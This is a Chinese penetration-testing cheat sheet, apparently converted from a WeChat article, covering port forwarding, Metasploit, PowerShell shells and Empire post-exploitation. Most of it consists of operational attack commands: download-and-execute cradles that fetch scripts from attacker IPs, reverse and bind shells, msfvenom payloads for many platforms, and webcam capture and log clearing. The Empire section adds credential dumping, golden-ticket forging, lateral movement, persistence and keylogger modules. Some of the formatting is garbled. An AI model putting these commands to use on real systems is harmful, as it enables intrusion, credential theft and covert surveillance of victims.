<meta name="referrer" content="no-referrer"/>
\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/BosStSgpWMIGCGnBnc7FLA)

![](https://mmbiz.qpic.cn/mmbiz_gif/GfOvuXUmaIichKN4fuyBV856xHdsnuRTeChfYItiaiaP6C5QQibXh56dmwWiaMFia2yE01nib45cPuiaib6kMd5OT95aeeA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "15254461546.gif")**端口映射&转发**  

### **MSF**

  

```
使用条件：服务器通外网，拥有自己的公网ip
>portfwd add -l 5555 -p 3389 -r 172.16.86.153
转发目标主机的3389远程桌面服务端口到本地的5555
>portfwd list

```

  

  

### **lcx.exe**

  

```
使用条件：服务器通外网，拥有自己的公网ip
靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389
linux攻击机：./portmap -m 2 -p1 9999 -p2 33889
windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889
PortTran
https://github.com/k8gege/K8tools/raw/master/PortTran.rar
攻击机执行
>PortTranS20.exe 12345 389

```

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yOnyrQL0PcZy55ksWzblFcM6MmydekGE4XlR69jTCQakNGibgziaOawxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

```
靶机执行

```

  

```
\>PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345
建立连接后，攻击机连接本机389端口即可

```

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### **SSH**

  

```
\-C 压缩传输，加快传输速度
-f 在后台对用户名密码进行认证
-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行
-q 安静模式，不要显示任何debug信息
-l 指定ssh登录名
-g 允许远程主机连接到本地用于转发的端口
-L 进行本地端口转发
-R 进行远程端口转发
-D 动态转发，即socks代理
-T 禁止分配伪终端
-p 指定远程ssh服务端口

```

  

  

#### **正向转发**

  

```
外网靶机110
内网靶机115
本地攻击机编辑后restart ssh服务
#vim /etc/ssh/sshd\_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
>ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22
本地攻击机执行，本地33890转发到远程的3389端口
上线MSF
攻击机出网Linux靶机--不出网Linux靶机--不出网win机
>msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe
攻击机监听端口12345
不出网Linux机
>ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22

```

  

  

#### **反向转发**

  

```
外网攻击107
内网靶机97
出网靶机编辑后restart ssh服务
#vim /etc/ssh/sshd\_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
>ssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22
出网靶机执行，把外部攻击机33890转发到内部隔离网络的3389
>netstat –tnlp

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)`  

  

```
\>vim /etc/rinetd.conf
添加0.0.0.0 3389 127.0.0.1 33890
>service rinetd start

```

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面


```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Invoke-SocksProxy

  

```
https://gitee.com/RichChigga/Invoke-SocksProxy
>Import-Module .\\Invoke-SocksProxy.psm1
>Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

### **SSF**

#### **单层网络正向转发**

  

```
https://github.com/securesocketfunneling/ssf/releases
内网机执行：
>ssfd.exe -p 1080

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

```
边界机器执行


```

  

```
\>ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98
把内网10.1.1.108的SSH转发出来

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

```
边界机器访问内网端口


```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### **单层网络反向转发**

  

```
边界机器执行：
>ssfd.exe -p 1080

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
内网机器执行：
>ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**Netsh**  

```
边界机器执行：


```

  

```
\>netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22
将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
\>netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389

```

  

```
当靶机某服务只允许内网访问时，将端口转发出来


```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
添加防火墙规则：


```

  

```
\>netsh advfirewall firewall add rule  protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow
列出所有转发规则:
>netsh interface portproxy show all

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
删除指定的端口转发规则：


```

  

```
\>netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98

```

  

```
删除所有转发规则：


```

  

```
\>netsh interface portproxy reset

```

  

### **Iptables**

  

```
需开启ip转发功能
>vim /etc/sysctl.conf设置net.ipv4.ip\_forward=1

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

```
本地端口22转发到2222上
>iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22
内网98机器3389转到本机110的6789上
>iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389
>iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
查看规则
>iptables -t nat -L
删除规则
>iptables -t nat -D PREROUTING 1
删除全部规则
>iptables -t nat –F

```

  

### chisel

  

```
https://github.com/jpillora/chisel
攻击机执行
>chisel server -p 12138 –reverse

```

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
靶机执行
>chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389

```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


  

```
还需创建两个txt记录，分别是指定开始和结束的字符串  

```


```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


  

```
靶机执行  

```

```


### 

```
`>Import-Module .\DNS_TXT_Pwnage.ps1``>DNS_TXT_Pwnage -startdomain start.zone.com -cmdstring cmd -commanddomain 1.zone.com -psstring start -psdomain zone.com -Subdomains 1 -StopString stop`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

### **Powershell**

#### **MSF+Powershell**

```
反弹MSF  
靶机  

```

```


### 

```
`反弹MSF``靶机``PS >IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1')` `PS >Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.0.100 -lport 6666 -force``攻击机：``>use exploit/multi/handler``>set payload windows/x64/meterpreter/reverse_ https``>run``或``>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f powershell -o /var/www/html/ps``>IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1")``>IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.100/ps")``>Invoke-Shellcode -Shellcode ($buf)``或``>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f psh-reflection >/var/www/html/a.ps1``>powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.101/a.ps1')"`
```






```

#### Powercat

```


### 

```
`>powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')``正向连接``靶机:powercat -l -p 8080 -e cmd.exe –v``攻击机:nc 192.168.0.1 8080 –vv``反向连接：``攻击机：nc –l –p 8080 –vv``靶机:powercat –c 192.168.0.1 –p 8080 –v –e cmd.exe``远程执行``>powershell -nop -w hidden -ep bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powercat/powercat.ps1'); powercat -c 192.168.0.107 -p 12345 -v -e cmd.exe"``正向连接``靶机:powercat -l -p 8080 -e cmd.exe -v``攻击机:nc 192.168.0.1 8080 -vv``反向连接：``攻击机：nc -l -p 8080 -vv``靶机:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

#### **Nishang**

##### **Bind shell**

```
靶机：  

```

```


### 

```
`靶机：``>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Bind -Port 12138"``攻击机：``>nc 靶机IP 12138`
```






```

##### **反向shell**

```


### 

```
`攻击机：``>nc -vnlp 9999``靶机：``>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 9999"`
```






```

##### **UDP反向shell**

```


### 

```
`攻击机：``>nc -lvup 12138``靶机：``>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 12138"`
```






```

##### **HTTPS**

```


### 

```
`攻击机：``>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1'); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443"  IP地址是本机IP`
```






```


```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


```
靶机：  

```

```


### 

```
>powershell -w hidden -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.98:8080/connect')
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

##### **ICMP**

```


### 

```
`攻击机IP:108``靶机IP:100``https://github.com/inquisb/icmpsh``靶机执行``>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp 192.168.0.108`
```






```


```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


```
攻击机执行，开启相应ICMP ECHO请求  

```

```


### 

```
`>sysctl -w net.ipv4.icmp_echo_ignore_all=1``>./icmpsh_m.py 192.168.0.108 192.168.0.100`
```






```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### Base64  

```


### 

```
>Powershell "$string="net user";[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))"
```

###   



```

```
**Metasploit**  

```

#### 常规使用

```


### 

```
`#systemctl start postgresql.service 启动数据库服务``#msfdb init 初始化数据库``#msfconsole进入MSF框架``#search  ms17-010 查找攻击模块``#use exploit/windows/smb/ms17_010_eternalblue 使用模块``#set payload windows/x64/meterpreter/reverse_tcp 设置载荷``#info 查看信息``#show options查看需要设置的参数``#set RHOST 192.168.125.138设置参数``#exploit 执行攻击模块``#back 回退`
```






```

#### 技巧使用

```


### 

```
`#handler -H 192.168.0.10 -P 3333 -p windows/x64/meterpreter/reverse_tcp快速监听``#setg 设置全局参数``#set autorunscript migrate –f 自动迁移进程``#set autorunscript migrate -n explorer.exe``#set AutoRunScript post/windows/manage/migrate``#set prependmigrate true 自动注入进程``#set prependmigrateProc svchost.exe``#set exitonsession false获取到session后继续监听，获得多个session``#set stagerverifysslcert false 防止出现ssl错误``#set SessionCommunicationTimeout 0 防止session超时退出``#set SessionExpirationTimeout 0 防止强制关闭session``#exploit -j -z  后台持续监听``>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -e x86/shikata_ga_nai -b "x00" -i 5 -a x86 --platform windows PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  1.exe 执行后注入到已存在的一个进程``>set EnableStageEncoding true``>set stageencoder x86/fnstenv_mov 编码进行免杀``>set stageencodingfallback false`
```






```

#### **模块**

##### **Auxiliary**

```


### 

```
#show auxiliary 查看所有模块
```






```

##### **Payload**

```


### 

```
`#show payloads 查看所有攻击载荷``Payload是目标被攻击时执行的实际功能代码``生成载荷``#use exploit/multi/script/web_delivery``>set target 2``>msfvenom --list payloads 列出所有payload``>msfvenom --list encoders 列出所有编码器`
```






```

###### **Windows**

```


### 

```
`#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe -o /root/1.exe``#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o 1.exe``#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f psh-reflection >xxx.ps1``#msfvenom -a x64 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1``>msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.0.1 LPORT=11111  -f exe> /root/1.exe  生成NC正向连接``>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe> 1.exe 生成NC反向连接`
```

###   



```

```
**Linux**  

```

```


### 

```
`#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e -f elf -a x86 --platform linux -o shell``#msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.1 LPORT=11111 -f raw > shell.sh`
```






```

###### **MacOS**

```


### 

```
#msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f macho > shell.macho
```






```

###### **Web**

```


### 

```
`#msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw > shell.php``#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f war > shell.war``#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f aspx -o payload.aspx``#msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.jsp``#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f asp > shell.asp`
```






```

###### **Android**

```


### 

```
`#msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f apk -o payload.apk``#msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 -f raw > shell.apk``#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 R > test.apk`
```

###   



```

```
**shellcode**  

```

```


### 

```
`#msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.1 LPORT=11111 -f c –o /root/1.c``#msfvenom -p cmd/unix/reverse_python LHOST=192.168.0.1 LPORT=11111 -o shell.py``#msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw > shell.py``#msfvenom -p cmd/unix/reverse_perl LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.pl``#msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.rb``#msfvenom -p cmd/unix/reverse_lua LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.lu`
```






```

###### **msf设置监听**

```


### 

```
`#use exploit/multi/handler``#set payloadwindows/meterpreter/reverse_http 指定相应的payload``#set LHOST 192.168.0.1``#set LPORT 11111``#exploit -j 后台监听``或在exploit模块中直接使用set payload 命令指定payload`
```

###   



```

```
**`Meterpreter`**
```

```


### 

```
`交互``当攻击成功后会返回会话，使用session -l命令列出当前获取到的会话``#session -l``使用``#sessions -i id 来进入一个会话进行交互``#background 将当前会话放置后台``#sessions -x检查心跳``#sessions -u [ID] cmdshell升级meterpreter shell`
```

###   



```

```
提权  

```

```


### 

```
提权详见提权模块
```






```

##### **命令**

```


### 

```
`#shell 进入目标cmdshell``#uictl [enable/disable] [keyboard/mouse/all]  开启或禁止键盘/鼠标``#uictl disable mouse  禁用鼠标``#uictl disable keyboard  禁用键盘``#webcam_list   查看摄像头``#webcam_snap   通过摄像头拍照``#webcam_stream  通过摄像头开启视频``#execute -H -i -f cmd.exe 执行cmd.exe，-H不可见，-i交互``#execute -H -m -d calc.exe -f wce.exe -a "-o 1.txt" 隐藏执行``#ps查看当前活跃进程``#migrate pid     迁移进程``#kill pid   #杀死进程`
```






```

##### **文件操作**

```


### 

```
`#pwd 查看当前目录``#ls 列出当前目录文件``#search -f *pass*        搜索文件``#cat c:\\passwd.txt   查看文件内容``#upload /tmp/pwn.txt C:\\1.txt   上传文件``#download c:\\passwd.txt /tmp/  下载文件``#edit c:\\1.txt  编辑或创建文件``#rm C:\\1.txt 删除文件``#mkdir folder  创建文件夹``#rmdir folder  删除文件夹``#lcd /tmp   #攻击者主机 切换目录``#timestomp -v C://2.txt   #查看时间戳``#timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt`
```






```

##### **后渗透&权限维持**

```
`路由添加，socks建立，后门建立等查看``查看后门&持久化板块`
```

##### **清理日志**

```


### 

```
#clearev
```

#### **MSF派生Cobalt strike和Empire**

##### **派生Empire**

```
`Empire创建一个Listener``创建一个stager选择windows/dll``MSF使用``>use post/windows/manage/reflective_dll_inject``指定session，dll的路径，进程pid`
```

##### **派生Cobalt Strike**

```
`cobalt 开启一个监听器windows/beacon_http/reverse_http``msf``>use exploit/windows/manage/payload_inject``指定IP、端口、payload即可`
```

### **Empire**

```
`安装``#git clone https://github.com/EmpireProject/Empire.git``#cd Empire/setup``#./install.sh`
```

#### **监听**

```
`(Empire) > listeners``(Empire: listeners) > uselistener http``(Empire: listeners) > info 查看参数信息``(Empire: listeners/http) > set Name y``(Empire: listeners/http) > set Host http://192.168.0.1``(Empire: listeners/http) > set Port 8080``(Empire: listeners/http) > execute``>back命令返回listeners模块``>list查看已激活的listener``>kill http删除监听`
```

#### **生成**

```
`(Empire: listeners) > usestager windows/launcher_vbs (双击tab键查看所有模块)``(Empire: stager/windows/launcher_vbs) > info``必须设置listener的名字，可设置生成位置``(Empire: stager/windows/launcher_vbs) > set Listener y``(Empire: stager/windows/launcher_vbs) > execute``可生成vbs，靶机执行即可上线。``使用launcher命令直接生成powershell或python脚本``>launcher powershell Listener-Name``使用rename对agents更名``>rename 6NMCW4ZB target1``使用main命令放回主菜单``>list stale 列出失去权限的机器``>remove stale 去除失去权限的机器`
```

  

#### **连接靶机及其他操作**

```
`>interact target1 连接``>agent 返回靶机列表``>back 返回上一层``>shell net user 1 1 /add 执行系统目录格式``>mimikazt 加载模块获取密码``>creds 整理获取的密码，creds export /root/1.txt 保存密码，creds hash/plaintext，显示格式``>sc 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot``>download c:\pass.txt 下载靶机文件到本机``>upload hacked.txt c:\hacked.txt 上传本机文件到靶机`
```

#### **提权**

```


```
`>agents 列表中Username没有星号则需要提权``>bypassuac listener需指定一个监听器 提权``>usemodule privesc/ms16-032需指定一个监听器 提权``>usemodule privesc/powerup/allchecks执行所有脚本检查漏洞`
```




```

#### **横向**

```


```
`查询域管登录机器``>usemodule situational_awareness/network/powerview/user_hunter`
```




```

##### **令牌窃取**

```


```
`>mimikatz``>creds  获取并整理hash及密码``>pth {ID}窃取管理员令牌``>steal_token {PID}`
```




```

##### **会话注入**

```


```
`>ps 查看进程``>usemodule management/psinject 设置ProcIP和Listener`
```




```

#####   

```
**Hash传递**
```

```


```
`Invoke-PsExec可能会被查杀``>usemodule situational_awareness/network/powerview/find_localadmin_access 列出可PSexec横向移动的机器``>usemodule lateral_movement/invoke_psexec需设置ComputerName和Listener``或``>usemodule lateral_movement/invoke_wmi需设置ComputerName和Listener，credID``跨域``父域域控：dc.zone.com``子域域控：sub.zone.com``子域计算机：pc.sub.zone.com``子域普通用户：sub\user1``查看信任关系``>usemodule situational_awareness/network/powerview/get_domain_trust``获取父域krbtgt SID，使用management/user_to_sid获取sid``需设置Domain和User=krbtgt``>usemodule credentials/mimikatz/dcsync 设置UserName 子域\krbtgt 获取子域hash``>usemodule credentials/mimikatz/golden_ticket 伪造sid``需设置User为伪造用户 sids伪造的标识符{krbtgt sid}-519``>usemodule credentials/mimikatz/dcsync 获取父域krbtgt的hash``>usemodule credentials/mimikatz/golden_ticket 使用父域krbtgt进行PTH攻击，指定父域CredID，用户名和域``>shell dir \\dc.zone.com\c$`
```




```

#### **后门&持久化**

##### **映像劫持**

```


```
`>usemodule lateral_movement/invoke_wmi_debugger``设置Listener，ComputerName(大写)，TargetBinary(sethc.exe, Utilman.exe, osk.exe, Narrator.exe, Magnify.exe)，分别是粘滞键，轻松访问，屏幕键盘，讲述人，放大镜。`
```




```

#####   

```
注入注册表启动项  

```

```


```
`>usemodule persistence/elevated/registry*``设置Listener，注册表路径RegPath [HKLM\software\microsoft\windows\currentversion\run]`
```




```

#####   

**计划任务**

```
`>usemodule persistence/elevated/schtasks*``设置Listener和DailyTime`
```

  

```
**WMI**
```

```


```
`>usemodule persistence/elevated/wmi``设置Listener`
```




```

##### **注入SSP**

```
查看SSP章节
```

#### **Collection（信息采集）**

<table style="width: 768px;"><thead><tr><th width="360">模块名</th><th width="16">功能</th></tr></thead><tbody><tr><td width="360">collection/ChromeDump</td><td width="16">收集chrome浏览器保存的密码和浏览历史记录</td></tr><tr><td width="360">collection/FoxDump</td><td width="16">收集Firefox浏览器保存的密码和浏览历史记录</td></tr><tr><td width="360">collection/USBKeylogger*</td><td width="16">利用ETW作为键盘记录</td></tr><tr><td width="360">collection/WebcamRecorder</td><td width="16">从摄像头捕获视频</td></tr><tr><td width="360">collection/browser_data</td><td width="16">搜索浏览器历史记录或书签</td></tr><tr><td width="360">collection/clipboard_monitor</td><td width="16">按指定的时间间隔监视剪贴板</td></tr><tr><td width="360">collection/file_finder</td><td width="16">查找域中的敏感文件</td></tr><tr><td width="360">collection/find_interesting_file</td><td width="16">查找域中的敏感文件</td></tr><tr><td width="360">collection/get_indexed_item</td><td width="16">获取Windows desktop search索引文件</td></tr><tr><td width="360">collection/get_sql_column_sample_data</td><td width="16">从目标SQL Server返回列信息。</td></tr><tr><td width="360">collection/get_sql_query</td><td width="16">在目标SQL服务器上执行查询</td></tr><tr><td width="360">collection/inveigh</td><td width="16">Windows PowerShell LLMNR/mDNS/NBNS中间人工具</td></tr><tr><td width="360">collection/keylogger</td><td width="16">键盘记录到keystrokes.txt文件中，文件位置/downloads/agentname/keystrokes.txt/agentname</td></tr><tr><td width="360">collection/minidump</td><td width="16">进程的全内存转储，PowerSploit的Out-Minidump.ps1</td></tr><tr><td width="360">collection/netripper</td><td width="16">将NetRipper注入目标进程，该进程使用API挂钩以拦截来自低特权用户的网络流量和与加密相关的功能，从而能够在加密之前/解密之后捕获纯文本流量和加密流量。</td></tr><tr><td width="360">collection/ninjacopy*</td><td width="16">通过读取原始卷并解析NTFS结构，从NTFS分区卷中复制文件。</td></tr><tr><td width="360">collection/packet_capture*</td><td width="16">使用netsh在主机上启动数据包捕获。</td></tr><tr><td width="360">collection/prompt</td><td width="16">提示当前用户在表单框中输入其凭据，然后返回结果。</td></tr><tr><td width="360">collection/screenshot</td><td width="16">屏幕截图</td></tr><tr><td width="360">collection/vaults/add_keepass_config_trigger</td><td width="16">寻找KeePass配置</td></tr><tr><td width="360">collection/vaults/find_keepass_config</td><td width="16">此模块查找并解析KeePass.config.xml (2.X)和KeePass.config.xml (1.X)文件。</td></tr><tr><td width="360">collection/vaults/get_keepass_config_trigger</td><td width="16">该模块从KeePass 2.X配置XML文件中提取触发器说明</td></tr><tr><td width="360">collection/vaults/keethief</td><td width="16">此模块检索未锁定的KeePass数据库的database mastey key信息</td></tr><tr><td width="360">collection/vaults/remove_keepass_config_trigger</td><td width="16">该模块从Find-KeePassConfig找到的所有KeePass配置中删除所有触发器</td></tr></tbody></table>

```
`>usemodule collection/ tab补齐查看模块``>usemodule collection/screenshot 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot``>usemodule collection/keylogger 键盘记录，文件存储在./Empire/download/agent名字/agent.log``>usemodule situational_awareness/host/winenum 查看当前用户、AD组、剪切板内容、系统版本、共享、网络信息、防火墙规则``>usemodule situational_awareness/network/powerview/share_finder 列出域内所有共享``>usemodule situational_awareness/network/arpscan``>set Range 192.168.0.1-192.168.0.100 ARP扫描，需设置扫描网段区间``>usemodule situational_awareness/network/portscan``>set Hosts 192.168.0.1-192.168.0.100 端口扫描，需设置IP或IP段``>usemodule situational_awareness/network/reverse_dns DNS信息，需设置IP``>set Range 192.168.0.1-192.168.0.100``>usemodule situational_awareness/network/powerview/get_domain_controller 查找域控`
```

```
**Code\_execution（代码执行）**  

```

